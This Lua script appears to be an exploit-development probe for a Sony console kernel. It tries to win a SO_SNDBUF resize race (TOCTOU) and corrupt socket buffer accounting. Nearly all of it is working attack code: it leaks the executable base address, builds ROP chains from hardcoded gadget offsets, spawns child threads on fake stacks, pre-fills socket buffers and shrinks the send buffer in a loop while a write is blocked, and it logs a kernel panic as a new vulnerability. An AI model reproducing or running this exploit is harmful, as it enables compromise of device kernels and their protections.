-- CRASH_CLASS: MODERATE
-- PROBE 93a2: SO_SNDBUF resize race — pre-fill strategy
--
-- 93a showed the race window is too narrow: 8KB sends complete atomically.
-- Fix: pre-fill the socket buffer to near-capacity BEFORE the child sends.
-- The child's sendmsg then BLOCKS in sbwait() waiting for space (holding sblock
-- but having dropped SOCKBUF_LOCK). While blocked, main thread shrinks SO_SNDBUF.
-- When the reader drains and wakes the child, sb_hiwat < sb_cc → corruption.
--
-- Also test: sendto instead of sendmsg (simpler, 4-arg fits child ROP),
-- and MSG_DONTWAIT to trigger EWOULDBLOCK at the sbspace check boundary.

print("=== PROBE 93a2: SO_SNDBUF pre-fill race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_pop_rcx  = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))

local function build_child_rop(stack_base, chain_fn)
    local sb = N(stack_base)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    local fsbase_ptr = memory.alloc(8)
    wq(N(fsbase_ptr), uint64(N(fake_tcb)))
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    chain_fn(emit)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    return rsp, sb
end

local function spawn_child(stack_base)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(N(stack_base)))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    pcall(function() mk(455)(par, uint64(0x38)) end)
    return tid
end

-- Helpers
local setval = memory.alloc(4)
local optval = memory.alloc(8)
local optlen = memory.alloc(8)
local fill_buf = memory.alloc(0x10000)
for i = 0, 0xFFFC, 4 do wd(N(fill_buf) + i, 0x43434343) end

local ITERS = 30
local anomalies = 0

-- [A] Confirm write(4) works from child for pre-fill
print("")
print("[A] BASELINE — write from child via ROP")
do
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    mk(135)(uint64(1), uint64(1), uint64(0), sp)
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp) + 4) or -1
    print(string.format("  socketpair: fW=%d fR=%d", fW, fR))

    local result = memory.alloc(8)
    wq(N(result), uint64(0xDEAD))
    local stk = memory.alloc(0x4000)
    build_child_rop(stk, function(emit)
        -- write(fW, fill_buf, 64)
        emit(g_pop_rdi); emit(uint64(fW))
        emit(g_pop_rsi); emit(uint64(N(fill_buf)))
        emit(g_pop_rdx); emit(uint64(64))
        emit(g_pop_rax); emit(uint64(4))
        emit(stub)
        emit(g_pop_rdi); emit(uint64(N(result)))
        emit(g_mov_m_rax)
    end)
    spawn_child(stk)
    for w = 1, 100000 do local _ = rd(N(stk)) end
    local wret = sgn(rq(N(result)))
    print(string.format("  child write(64): ret=%d", wret))
    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

-- [B] RACE: pre-fill → child blocks on write → main shrinks sndbuf → reader drains
print("")
print("[B] RACE — pre-fill + blocking write + shrink")
print(string.format("  %d iterations", ITERS))
print("")

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** PROCESS DEAD ***", iter))
        break
    end

    -- Fresh socketpair
    local sp = memory.alloc(8)
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp) + 4) or -1
    if r ~= 0 then
        if iter <= 3 then print(string.format("  iter %d: socketpair fail", iter)) end
        break
    end

    -- Set large SO_SNDBUF (65536)
    wd(N(setval), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

    -- Read actual sndbuf
    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
    local actual_sndbuf = rd(N(optval)) or 0

    -- Pre-fill: write from main thread until it would block
    local filled = 0
    local CHUNK = 4096
    for fill = 1, 20 do
        -- Use MSG_DONTWAIT (0x80) so we don't block
        local sr = sgn(mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(CHUNK), uint64(0x80)))
        if sr > 0 then
            filled = filled + sr
        else
            break
        end
    end

    -- Now the buffer is nearly full. Child will try a LARGE blocking write.
    local child_result = memory.alloc(8)
    wq(N(child_result), uint64(0xDEAD))
    local marker = memory.alloc(8)
    wq(N(marker), uint64(0))

    local stk = memory.alloc(0x4000)
    build_child_rop(stk, function(emit)
        -- Mark child started
        emit(g_pop_rax); emit(uint64(0xBBBB0001))
        emit(g_pop_rdi); emit(uint64(N(marker)))
        emit(g_mov_m_rax)
        -- write(fW, fill_buf, 16384) — will BLOCK waiting for space
        emit(g_pop_rdi); emit(uint64(fW))
        emit(g_pop_rsi); emit(uint64(N(fill_buf)))
        emit(g_pop_rdx); emit(uint64(16384))
        emit(g_pop_rax); emit(uint64(4))
        emit(stub)
        -- Store result
        emit(g_pop_rdi); emit(uint64(N(child_result)))
        emit(g_mov_m_rax)
    end)

    spawn_child(stk)

    -- Brief spin to let child enter sbwait
    for w = 1, 5000 do local _ = rd(N(stk)) end

    -- *** RACE WINDOW: shrink SO_SNDBUF while child is blocked ***
    for shrink = 1, 50 do
        wd(N(setval), 1)
        pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
    end

    -- Now drain the read side → this wakes the blocked child
    -- Child sees stale sbspace from before the shrink
    local total_drained = 0
    local drain = memory.alloc(0x4000)
    for d = 1, 30 do
        local dr = sgn(mk(3)(uint64(fR), drain, uint64(0x4000)))
        if dr > 0 then total_drained = total_drained + dr else break end
    end

    -- Wait for child
    for w = 1, 100000 do local _ = rd(N(stk)) end

    local m = rq(N(marker))
    local cret = sgn(rq(N(child_result)))
    local ran = (N(m) ~= 0)

    -- Read post-race state
    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
    local post_sndbuf = rd(N(optval)) or 0

    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1007), optval, optlen) end)
    local so_error = rd(N(optval)) or 0

    local is_anomaly = false
    if ran and cret > 0 and post_sndbuf > 0 and cret > post_sndbuf * 2 then
        is_anomaly = true; anomalies = anomalies + 1
    end
    if so_error ~= 0 then
        is_anomaly = true; anomalies = anomalies + 1
    end

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)

    if is_anomaly then
        print(string.format("  iter %d: *** ANOMALY *** fill=%d child_wrote=%d sndbuf=%d err=%d",
            iter, filled, cret, post_sndbuf, so_error))
    elseif iter <= 3 or iter == ITERS or iter % 10 == 0 then
        print(string.format("  iter %d: fill=%d child=%d sndbuf=%d ran=%s",
            iter, filled, cret, post_sndbuf, ran and "Y" or "N"))
    elseif iter == 4 then
        print("  ...")
    end
end

if not alive() then
    print("")
    print("*** PROCESS DIED — kernel corruption from SO_SNDBUF race ***")
    print("*** SO_SNDBUF TOCTOU CONFIRMED ***")
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:  %d", ITERS))
print(string.format("  anomalies:   %d", anomalies))
print(string.format("  process:     %s", alive() and "ALIVE" or "DEAD"))

if not alive() then
    print("*** KERNEL PANIC — NEW VULNERABILITY ***")
elseif anomalies > 0 then
    print("*** BUFFER ACCOUNTING ANOMALY — race hits ***")
else
    print("Clean. Either Sony patched the lock gap or timing needs tuning.")
end

print("")
print("=== 93a2 COMPLETE ===")
